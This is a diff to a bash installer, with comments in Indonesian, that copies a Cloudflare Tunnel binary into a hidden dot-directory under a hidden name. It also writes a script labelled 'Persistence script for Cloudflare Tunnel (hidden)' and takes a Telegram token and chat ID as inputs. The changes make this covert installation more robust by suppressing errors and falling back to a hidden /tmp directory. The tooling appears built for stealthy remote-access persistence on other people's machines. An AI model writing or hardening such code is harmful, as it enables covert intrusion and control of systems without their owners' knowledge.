@@ -124,7 +124,7 @@ create_persistence_script() {
     local script_path="${HOME}/.${CONFIG_DIR}/cf_tunnel.sh"
     local telegram_token="$3"
     local telegram_chat="$4"
-    mkdir -p "${HOME}/.${CONFIG_DIR}"
+    mkdir -p "${HOME}/.${CONFIG_DIR}" 2>/dev/null || true
     cat > "$script_path" <<EOF
 #!/bin/bash
 # Persistence script for Cloudflare Tunnel (hidden)
@@ -258,11 +258,26 @@ print_step "Unpacking binaries..."
 sleep 0.1
 finish_ok
 
-# --- Step 3: Copying binaries ---
+# --- Step 3: Copying binaries dengan fallback ---
 print_step "Copying binaries..."
+# Coba buat direktori di home
 INSTALL_DIR="${HOME}/.${CONFIG_DIR}"
-mkdir -p "$INSTALL_DIR"
-cp "$cf_bin" "$INSTALL_DIR/$BIN_HIDDEN_NAME" 2>/dev/null || finish_failed
+if ! mkdir -p "$INSTALL_DIR" 2>/dev/null; then
+    warn "Cannot create $INSTALL_DIR, using /tmp instead"
+    INSTALL_DIR="/tmp/.${CONFIG_DIR}-${UID}"
+    mkdir -p "$INSTALL_DIR" || finish_failed
+fi
+
+# Pastikan binary sumber ada
+if [[ ! -f "$cf_bin" ]]; then
+    error "Binary not found at $cf_bin"
+    finish_failed
+fi
+
+cp "$cf_bin" "$INSTALL_DIR/$BIN_HIDDEN_NAME" 2>/dev/null || {
+    error "Failed to copy binary to $INSTALL_DIR"
+    finish_failed
+}
 chmod 755 "$INSTALL_DIR/$BIN_HIDDEN_NAME"
 cf_bin="$INSTALL_DIR/$BIN_HIDDEN_NAME"
 finish_ok
